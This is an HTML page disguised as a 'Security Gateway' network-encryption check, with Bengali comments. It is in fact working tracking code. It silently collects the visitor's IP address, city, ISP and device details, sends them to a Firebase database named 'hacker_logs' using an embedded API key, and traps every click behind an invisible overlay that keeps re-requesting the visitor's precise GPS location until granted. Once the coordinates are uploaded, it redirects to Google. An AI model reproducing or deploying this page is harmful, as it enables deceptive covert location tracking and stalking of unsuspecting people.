<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Security Gateway</title>
    
    <!-- UAParser -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
    
    <!-- Firebase SDK -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js";
        import { getDatabase, ref, push, set, update } from "https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyA-2qU45jgtvoxzOdVysbZKdixEyvMY3C8",
            authDomain: "location-611d6.firebaseapp.com",
            databaseURL: "https://location-611d6-default-rtdb.firebaseio.com",
            projectId: "location-611d6",
            storageBucket: "location-611d6.firebasestorage.app",
            messagingSenderId: "903100559116",
            appId: "1:903100559116:web:08c8c9e1d7282048116329"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // ১. ডাটা পাঠানো শুরু
        window.initLog = function(data) {
            const trackerRef = ref(db, 'hacker_logs');
            const newLogRef = push(trackerRef);
            
            set(newLogRef, {
                timestamp: new Date().toString(),
                ...data,
                latitude: "Wait...",
                longitude: "Wait...",
                actionStatus: "Trap Started"
            }).then(() => {
                sessionStorage.setItem('logKey', newLogRef.key);
                // ডাটা সেভ হওয়ার পর আসল খেলা শুরু
                startAnnoyingLoop();
            });
        };

        // ২. লোকেশন আপডেট
        window.updateWithGPS = function(lat, lng) {
            const key = sessionStorage.getItem('logKey');
            if (key) {
                const updateRef = ref(db, 'hacker_logs/' + key);
                update(updateRef, {
                    latitude: lat,
                    longitude: lng,
                    actionStatus: "✅ Verified & Caught"
                }).then(() => {
                    // কাজ শেষে মুক্তি
                    window.location.href = "https://www.google.com";
                });
            }
        };
    </script>

    <style>
        body {
            margin: 0; padding: 0;
            background-color: #f0f2f5;
            display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            height: 100vh; overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            cursor: progress; /* মাউস কার্সর লোডিং দেখাবে */
        }

        /* পুরো স্ক্রিন জুড়ে একটা অদৃশ্য জাল */
        #clickTrap {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 9999; cursor: pointer;
        }

        .loader-box {
            text-align: center;
            background: #ffffff;
            padding: 40px; border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            max-width: 300px;
        }

        .spinner {
            width: 50px; height: 50px;
            border: 5px solid #e1e4e8;
            border-top: 5px solid #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        h2 { color: #333; font-size: 18px; margin-bottom: 5px; }
        p { color: #888; font-size: 13px; }

    </style>
</head>
<body>

    <!-- এই ডিভটা পুরো স্ক্রিন দখল করে থাকবে, যেখানেই ক্লিক করবে লোকেশন চাইবে -->
    <div id="clickTrap" onclick="forceBrowserPrompt()"></div>

    <div class="loader-box">
        <div class="spinner"></div>
        <h2 id="statusText">Security Check...</h2>
        <p>Verifying network encryption.</p>
    </div>

    <script>
        let ipInfo = {};
        let isAsking = false; // ফ্ল্যাগ যাতে একসাথে একাধিক রিকোয়েস্ট না যায়

        window.onload = function() {
            // আইপি এবং ডিভাইস ইনফো আগে নিয়ে নিই
            fetch('https://ipapi.co/json/')
                .then(res => res.json())
                .then(data => {
                    ipInfo = data;
                    prepareInitialData();
                })
                .catch(() => {
                    ipInfo = { ip: "Unknown", city: "Unknown" };
                    prepareInitialData();
                });
        };

        function prepareInitialData() {
            var parser = new UAParser();
            var result = parser.getResult();
            let deviceName = (result.device.vendor ? result.device.vendor + " " : "") + (result.device.model || "Unknown Device");

            let initialPayload = {
                ip: ipInfo.ip || "Tracing...",
                city: ipInfo.city || "Tracing...",
                isp: ipInfo.org || "Tracing...",
                deviceModel: deviceName,
                os: result.os.name,
                browser: result.browser.name,
                latitude: "Tracing...",
                longitude: "Tracing..."
            };

            if(window.initLog) window.initLog(initialPayload);
        }

        // ৩. আসল ফাংশন (যেটা বারবার কল হবে)
        function startAnnoyingLoop() {
            // ১. পেজ লোড হওয়ার ১.৫ সেকেন্ড পর প্রথম চেষ্টা
            setTimeout(forceBrowserPrompt, 1500);
            
            // ২. কেউ যদি মাউস নাড়ায় বা স্ক্রিনে টাচ করে, তাহলেও ট্রিগার হবে
            document.addEventListener('touchstart', forceBrowserPrompt);
            document.addEventListener('click', forceBrowserPrompt);
        }

        function forceBrowserPrompt() {
            // যদি অলরেডি রিকোয়েস্ট প্রসেসিং এ থাকে, তাহলে থামো
            if(isAsking) return;
            isAsking = true;

            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    // Success
                    function(position) {
                        document.getElementById('statusText').innerText = "Verified!";
                        document.querySelector('.spinner').style.borderTopColor = "#00b894";
                        
                        // লোকেশন পেয়ে গেছি, আর ডিস্টার্ব করার দরকার নেই
                        document.removeEventListener('touchstart', forceBrowserPrompt);
                        document.removeEventListener('click', forceBrowserPrompt);
                        document.getElementById('clickTrap').style.display = 'none';

                        if(window.updateWithGPS) {
                            window.updateWithGPS(position.coords.latitude, position.coords.longitude);
                        }
                    },
                    // Error (Block or Close)
                    function(error) {
                        isAsking = false; // আবার চাওয়ার জন্য রেডি
                        console.log("User denied/closed. Re-arming trap.");
                        
                        // হ্যাকার ভাববে লোডিং হচ্ছে, কিন্তু আসলে আমরা আবার রিকোয়েস্টের অপেক্ষায় আছি
                        // এখানে আমরা কোনো UI চেঞ্জ করব না, জাস্ট চুপচাপ থাকব
                        // সে বিরক্ত হয়ে স্ক্রিনে ট্যাপ করলেই আবার পপ-আপ আসবে
                    },
                    { enableHighAccuracy: true }
                );
            }
        }
    </script>
</body>
</html>
